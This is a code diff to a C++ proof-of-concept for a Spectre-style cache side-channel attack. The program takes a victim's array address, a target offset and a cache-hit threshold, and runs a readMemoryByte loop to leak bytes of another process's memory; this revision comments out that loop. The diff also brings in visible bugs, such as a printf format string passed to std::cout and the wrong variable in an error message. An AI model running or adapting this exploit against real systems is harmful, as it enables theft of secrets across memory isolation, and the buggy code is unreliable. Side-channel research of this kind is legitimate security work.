@@ -19,6 +19,7 @@
 #include <chrono>
 #include <vector>
 #include <bitset>
+#include <tuple>
 
 // C Includes:
 #include <cstdio>
@@ -43,9 +44,13 @@
 /********************************************************************
 Attacker globals.
 ********************************************************************/
-void* target_va;          // VM Address of victim's array (e.g. array1[])
-int64_t target_x_offset;  // Offset relative to victim's array
-size_t target_size;       // Number of bytes to attempt to read at offset
+// [Optional] Relevant virtual addresses for attacker's convenience:
+void* target_array1_va;   // VM Address of victim's array (e.g. array1[])
+void* target_va;          // VM Address of target in victim
+
+// Target offsets (attack only needs this):
+int64_t target_x_offset;  // Offset relative to victim's array1
+int64_t target_size;      // Number of bytes to attempt to read at offset
 
 
 /********************************************************************
@@ -395,13 +400,16 @@ void print_config() {
   std::cout << std::endl;
 }
 
-auto parse_args(int argc, char* const argv[]) {
-//  void* target_va;          // VM Address of victim's array (e.g. array1[])
-//  int64_t target_x_offset;  // Offset relative to victim's array
-//  size_t target_size;       // Number of bytes to attempt to read at offset
+void parse_args(int argc, char* const argv[]) {
+ /*  Command line arguments:
+  *  1: Victim's secret VA address start (size_t)
+  *  2: Victim's secret byte count (int64_t)
+  *  3: Cache hit threshold (size_t)
+  */
 
   int c;
-  while ( (c = getopt(argc, argv, "p:s:l:o:c:")) != -1) {
+  opterr = 0;
+  while ( (c = getopt(argc, argv, "p:s:l:o:c:")) > 0) {
     switch (c) {
     case 'p':
       target_va = reinterpret_cast<void*>(atoll(optarg));
@@ -414,37 +422,18 @@ auto parse_args(int argc, char* const argv[]) {
       target_x_offset = atoll(optarg);
       break;
     case 'c':
-      cache_hit_threshold = atoi(optarg);
+      cache_hit_threshold = atoll(optarg);
+      break;
     case '?':
-      std::cerr << "Unknown argument: " << optopt << std::endl;
+      std::cerr << "Unknown argument: " << opterr << std::endl;
+      exit(EXIT_FAILURE);
     default:
+      std::cerr << "Unexpected argument char: " << optarg << std::endl;
       exit(EXIT_FAILURE);
     }
   }
 
-//  // Calculate target index-offset (bytes) from Victim's vulnerability (array1):
-//  size_t malicious_x = 0;
-//  int len = 8;
-/////  size_t malicious_x = (size_t)(secret - (char *)array1);
-//  /* Parse the Victim's secret virtual-address and length from the first and second
-//     command line argument. (OPTIONAL) */
-//  if (argc >= 3) {
-//    sscanf(argv[1], "%p", (void **)(&malicious_x));
-
-//    /* Convert input value into a pointer */
-////    malicious_x -= (size_t)array1;
-
-//    sscanf(argv[2], "%d", &len);
-//  }
-
-//  /* Parse the cache_hit_threshold from the first command line argument.
-//     (OPTIONAL) */
-//  if (argc >= 4) {
-//    sscanf(argv[3], "%d", &cache_hit_threshold);
-//  }
-
-  // return tuple...
-  return 0;
+  // TODO: ensure sufficient arguments are passed in...
 }
 
 
@@ -455,7 +444,7 @@ void send_worker(uint16_t port = 7777) {
   uint8_t buf[2048];
 
   SocketUDP s;
-  assert(s.setRemote("127.0.0.1", port));
+  assert(s.setRemote("127.0.0.1", port) == 0);
   std::cout << "["<<port<<"] - Sender worker thread listening." << std::endl;
   measurements.reserve(1<<20); // Reserve 1 MB of measurements
 
@@ -467,6 +456,8 @@ void send_worker(uint16_t port = 7777) {
     std::string in;
     std::cout << "Ready to send?" << std::endl;
     std::cin >> in;
+
+    // TODO: Add proper side-channel analysis here...
 
     // Repeat 100 times:
     while (++tries % 100 != 0) {
@@ -499,12 +490,16 @@ int main(int argc, char* const argv[]) {
   print_config();
   init_pages();
 
-  auto args = parse_args(argc, argv);
-  // do something with args tuple
-  size_t malicious_x = 0;
-  int len = 8;
-  printf("Reading %d bytes:\n", len);
-  printf("Reading at malicious_x = %p...\n", (void*)malicious_x);
+  parse_args(argc, argv);
+  if (target_va != 0) {
+    std::cout << "Supplied array1 virtual address: 0x" << target_array1_va << '\n';
+    std::cout << "Targeting virtual address: 0x" << target_va << '\n';
+    std::cout << "Calculated target_offset: " << target_x_offset << '\n';
+  }
+  else {
+    std::cout << "Supplied target_offset:" << target_x_offset << '\n';
+  }
+  std::cout << "Reading %ll bytes" << target_size << std::endl;
 
   // What is this doing?
   #ifdef NOCLFLUSH
@@ -513,8 +508,7 @@ int main(int argc, char* const argv[]) {
   }
   #endif
 
-  int score[2];
-  uint8_t value[2];
+
 
   // Create a cpu_set_t object representing a set of CPUs. Clear it and mark
   // only CPU i as set.
@@ -527,27 +521,30 @@ int main(int argc, char* const argv[]) {
   if (rc != 0) {
     std::cerr << "Error calling pthread_setaffinity_np: " << rc << "\n";
   }
-
   t.join(); // wait until exits for now...
 
-  /* Start the read loop to read each address */
-  while (--len >= 0) {
-    /* Call readMemoryByte with the required cache hit threshold and
-       malicious x address. value and score are arrays that are
-       populated with the results.
-    */
-    readMemoryByte(cache_hit_threshold, malicious_x++, value, score);
+//  /* Start the read loop to read each address */
+//  auto len = target_size;
+//  auto malicious_x = target_x_offset;
+//  while (--len >= 0) {
+//    int score[2];
+//    uint8_t value[2];
+//    /* Call readMemoryByte with the required cache hit threshold and
+//       malicious x address. value and score are arrays that are
+//       populated with the results.
+//    */
+//    readMemoryByte(cache_hit_threshold, malicious_x++, value, score);
 
-    /* Display the results */
-    printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
-    printf("0x%02X=’%c’ score=%d ", value[0],
-           (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
-    if (score[1] > 0) {
-      printf("(second best: 0x%02X=’%c’ score=%d)", value[1],
-             (value[1] > 31 && value[1] < 127 ? value[1] : '?'), score[1]);
-    }
-    printf("\n");
-  }
+//    /* Display the results */
+//    printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
+//    printf("0x%02X=’%c’ score=%d ", value[0],
+//           (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
+//    if (score[1] > 0) {
+//      printf("(second best: 0x%02X=’%c’ score=%d)", value[1],
+//             (value[1] > 31 && value[1] < 127 ? value[1] : '?'), score[1]);
+//    }
+//    printf("\n");
+//  }
 
   return EXIT_SUCCESS;
 }
